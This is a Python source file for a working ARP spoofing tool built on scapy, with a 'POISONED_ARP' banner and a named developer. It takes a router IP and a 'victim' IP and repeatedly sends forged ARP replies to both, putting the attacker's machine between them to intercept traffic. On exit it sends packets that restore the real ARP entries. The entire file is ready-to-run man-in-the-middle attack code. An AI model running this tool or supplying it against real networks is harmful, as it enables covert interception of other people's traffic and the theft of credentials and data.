#!/usr/bin/env python

from colorama import Fore
import scapy.all as scapy
import time


def args():
    print(Fore.GREEN + "Enter the Router's IP Address")
    RouterIP = input('')
    print("\nEnter the Victim's IP Address")
    VictimIP = input('')
    print('')
    IP = {
        'router': RouterIP,
        'victim': VictimIP
    }
    return IP


def display():
    print(Fore.RED + '''
    
    \t\t\t\t########   #######  ####  ######   #######   ##    ## #### ########            ###    ########  ########  
    \t\t\t\t##     ## ##     ##  ##  ##    ## ##     ##  ###   ##  ##     ##              ## ##   ##     ## ##     ## 
    \t\t\t\t##     ## ##     ##  ##  ##       ##     ##  ####  ##  ##     ##             ##   ##  ##     ## ##     ## 
    \t\t\t\t########  ##     ##  ##   ######  ##     ##  ## ## ##  ##     ##            ##     ## ########  ########  
    \t\t\t\t##        ##     ##  ##        ## ##     ##  ##  ####  ##     ##            ######### ##   ##   ##        
    \t\t\t\t##        ##     ##  ##  ##    ## ##     ##  ##   ###  ##     ##            ##     ## ##    ##  ##        
    \t\t\t\t##         #######  ####  ######   #######   ##    ## ####    ##   #######  ##     ## ##     ## ##    
    -----------------------------------------------------------------------------------------------------------------------------------------------------------------   
    | Developer: Kedar Parikh | Email: kedar@decryptingtechnology.com | Website: www.decryptingtechnology.com | YouTube Channel: www.youtube.com/DecryptingTechnology | 
    -----------------------------------------------------------------------------------------------------------------------------------------------------------------
    ''')


def getmac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = broadcast / request
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoofed_ip,):
    destmac = getmac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destmac, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


def restore_iptab(target, destination):
    targetmac = getmac(target)
    destmac = getmac(destination)
    packet = scapy.ARP(op=2, pdst=target, hwdst=targetmac, psrc=destination, hwsrc=destmac)
    scapy.send(packet, verbose=False)


count = 0

try:
    display()
    IP = args()
except KeyboardInterrupt:
    print(Fore.RED + '\n[*] CTRL + C Detected!')
    print('[*] Quitting!')
    print(Fore.RESET)
    exit(0)

try:
    while True:
        spoof(IP['victim'], IP['router'])
        spoof(IP['router'], IP['victim'])
        count += 2
        print(Fore.GREEN + "\r[+] ARP Packet's Sent: " + str(count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print(Fore.RED + '\n\n[*] CTRL + C Detected!')
    respackcount = 0
    dispdot = 10
    print('[*] Restoring IP Tables')
    while respackcount != 6:
        restore_iptab(IP['victim'], IP['router'])
        restore_iptab(IP['router'], IP['victim'])
        print('\r[*] Status: [' + str(dispdot * respackcount * 2) + '%' + ']', end='')
        time.sleep(2)
        respackcount += 1
    print('\n[*] Quitting')
    time.sleep(1)
    print(Fore.RESET)
    exit(0)

except IndexError:
    print(Fore.RED + '[*] Invalid IP Address!')
    print('[*] Quitting')
    print(Fore.RESET)
    exit(0)